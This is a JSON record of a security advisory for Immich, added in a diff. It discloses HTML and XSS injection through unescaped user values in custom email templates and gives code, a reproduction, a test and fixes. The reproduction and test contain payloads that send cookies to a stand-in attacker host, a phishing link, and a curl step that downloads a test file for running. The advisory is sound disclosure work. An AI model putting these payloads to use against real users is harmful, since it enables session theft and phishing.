@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-v94m-9pp2-pm59",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 5.4,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "description": "### Summary\r\n\r\nWhen an admin enables custom email templates, Immich substitutes user-controlled values (display names, album names, usernames) into the template via raw string replacement with no HTML escaping, and then renders the result via React's `dangerouslySetInnerHTML`. Any normal user can plant arbitrary HTML - phishing links, image tags, attribute-rewriting payloads, sometimes script - into the emails the admin-configured templates send to other users. The default templates aren't affected; the bug only triggers when custom templates are configured, but the injected content comes from ordinary users with no special privileges.\r\n\r\n### Details\r\n\r\nThe substitution function does not escape its inputs - `server/src/utils/replace-template-tags.ts:1-5`:\r\n\r\n```ts\r\nexport const replaceTemplateTags = (template: string, variables: Record<string, string | undefined>) => {\r\n  return template.replaceAll(/{(.*?)}/g, (_, key) => {\r\n    return variables[key] || `{${key}}`;\r\n  });\r\n};\r\n```\r\n\r\nThe resulting string is then dropped into the React tree as raw HTML - three email components are affected:\r\n\r\n**`server/src/emails/welcome.email.tsx:44`:**\r\n\r\n```tsx\r\n{customTemplate && (\r\n  <Text className=\"m-0\">\r\n    <div dangerouslySetInnerHTML={{ __html: emailContent }}></div>\r\n  </Text>\r\n)}\r\n```\r\n\r\n**`server/src/emails/album-invite.email.tsx:43`** - same pattern.\r\n\r\n**`server/src/emails/album-update.email.tsx:42`** - same pattern.\r\n\r\nThe tag values fed into the substitution are all user-controlled:\r\n\r\n| Template tag | Source | Who controls it |\r\n|--------------|--------|-----------------|\r\n| `{senderName}` | The sharing user's `name` field | Any user |\r\n| `{recipientName}` | The recipient user's `name` field | Any user |\r\n| `{displayName}`, `{username}` | User registration | Any user |\r\n| `{albumName}` | Album creator | Any user |\r\n| `{password}` | Admin-set when creating accounts | Admin (less interesting) |\r\n\r\nCustom templates are an admin-only opt-in setting, which is why this is Medium rather than High - but the bug is exploitable by ordinary users once an admin turns the feature on.\r\n\r\n### PoC\r\n\r\n**Configuration:** an Immich instance running v2.7.5 where the admin has enabled a custom album-invite template. The template must contain at least one user-controlled placeholder like `{senderName}` or `{albumName}`.\r\n\r\n**Reproduction steps:**\r\n\r\n1. **As an attacker** (any normal Immich user), update your display name to a phishing payload:\r\n\r\n   ```\r\n   PATCH /api/users/me\r\n   { \"name\": \"</p><a href=\\\"https://attacker.example/phish\\\">Reset your password</a><p>\" }\r\n   ```\r\n\r\n2. Or, equivalently, create an album whose name is the payload:\r\n\r\n   ```\r\n   POST /api/albums\r\n   { \"albumName\": \"<img src=x onerror=\\\"fetch('https://attacker.example/?c='+document.cookie)\\\">\" }\r\n   ```\r\n\r\n3. Share that album with the victim.\r\n\r\n4. The server renders the configured custom template, substitutes your display name / album name with no escaping, and emits the resulting HTML inside `dangerouslySetInnerHTML`.\r\n\r\n5. The victim receives an email that, depending on their mail client, renders:\r\n   - **Always:** a phishing link styled as legitimate Immich content, on the legitimate domain.\r\n   - **Some clients (legacy webmail, certain mobile clients):** active JavaScript in the mail-origin context.\r\n\r\n**Source-level reproduction (vitest):**\r\n\r\nA complete vitest PoC for all five findings in this audit is published as a secret gist:\r\n\r\n<https://gist.github.com/Dredsen/b423a6c62cdb561b712803643a21b8fb>\r\n\r\nDownload into the Immich server workspace and run:\r\n\r\n```bash\r\ncurl -sL https://gist.githubusercontent.com/Dredsen/b423a6c62cdb561b712803643a21b8fb/raw/security-pocs.spec.ts \\\r\n  -o server/src/services/security-pocs.spec.ts\r\ncd server\r\npnpm install\r\npnpm test src/services/security-pocs.spec.ts --run\r\n```\r\n\r\nTest relevant to this finding:\r\n- `Finding 3: email template HTML injection > replaceTemplateTags does NOT html-escape attacker-controlled values`\r\n\r\nThe key assertion in the suite:\r\n\r\n```ts\r\nit('replaceTemplateTags does NOT html-escape attacker-controlled values', () => {\r\n  const maliciousSenderName =\r\n    '<img src=x onerror=\"fetch(\\'https://attacker.example/?c=\\'+document.cookie)\">';\r\n  const maliciousAlbumName =\r\n    '</p><a href=\"https://attacker.example/phish\">Reset your password</a><p>';\r\n\r\n  const output = replaceTemplateTags(\r\n    'Hello {recipientName}! {senderName} shared {albumName} with you.',\r\n    { recipientName: 'Victim', senderName: maliciousSenderName, albumName: maliciousAlbumName },\r\n  );\r\n\r\n  expect(output).toContain('<img src=x onerror=');\r\n  expect(output).toContain('<a href=\"https://attacker.example/phish\"');\r\n  expect(output).not.toContain('&lt;img');  // would be present in a safe impl\r\n});\r\n```\r\n\r\nThe test passes on v2.7.5 source as shipped.\r\n\r\n### Impact\r\n\r\nThis is a **stored HTML / phishing injection** into outbound transactional email, plus **stored XSS** in mail clients that execute JS.\r\n\r\nAffected population: instances that have enabled custom email templates. Anyone who is invited to an album, added to a shared album, or receives a welcome email on that instance is a potential victim.\r\n\r\nWhat an attacker gets:\r\n\r\n- **High-trust phishing.** The email comes from the legitimate Immich instance, is delivered through the instance's SMTP setup, and visually matches the legitimate template (because it *is* the legitimate template, with one placeholder hijacked). Click-through rates on this kind of phish are dramatically higher than externally-spoofed mail.\r\n- **Button shadowing.** Injected `<a>` tags can sit on top of or replace the legitimate \"View album\" / \"Login\" buttons.\r\n- **Script execution in specific clients.** Some webmail clients (including legacy and embedded ones) render limited JS; on those, injected `<img onerror>` or `<script>` runs in the mail-origin context, which may have access to mail content, session cookies, or contacts.\r\n\r\nConfidentiality and integrity are both low-to-medium; availability is unaffected. The scope is \"changed\" in CVSS terms because the impact occurs in a different security context (the recipient's mail client) than the vulnerable component (Immich).\r\n\r\n### Suggestions to fix\r\n\r\n**Option A - minimal, drop-in escape.** In `server/src/utils/replace-template-tags.ts`:\r\n\r\n```ts\r\nimport { escape } from 'lodash';\r\n\r\nexport const replaceTemplateTags = (\r\n  template: string,\r\n  variables: Record<string, string | undefined>,\r\n) => {\r\n  return template.replaceAll(/{(.*?)}/g, (_, key) => {\r\n    const value = variables[key];\r\n    return value === undefined ? `{${key}}` : escape(value);\r\n  });\r\n};\r\n```\r\n\r\nThis neutralises all the immediate exploits with one line of change.\r\n\r\n**Option B - preferred, structurally safer.** Stop using `dangerouslySetInnerHTML` in the three email components. Either render the custom template as React text nodes with `{variables.senderName}` (and accept that admins can only customise structure, not raw HTML), or sanitize the resulting HTML through DOMPurify before rendering. This eliminates the entire class of bug rather than papering over the immediate instance.\r\n\r\nIf keeping rich-HTML template support is a hard requirement, Option A plus an admin-facing warning that template authors should not place user-controlled placeholders inside HTML attributes is the next-best compromise.",
+    "ghsa_id": "GHSA-v94m-9pp2-pm59",
+    "html_url": "https://github.com/immich-app/immich/security/advisories/GHSA-v94m-9pp2-pm59",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-v94m-9pp2-pm59"
+      }
+    ],
+    "published_at": "2026-11-10T18:45:31Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Email HTML injection",
+    "updated_at": "2026-11-10T18:45:31Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "immich-app/immich"
+        },
+        "patched_versions": "v3.4.0",
+        "vulnerable_version_range": "<= v3.3.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "immich-app/immich"
+}
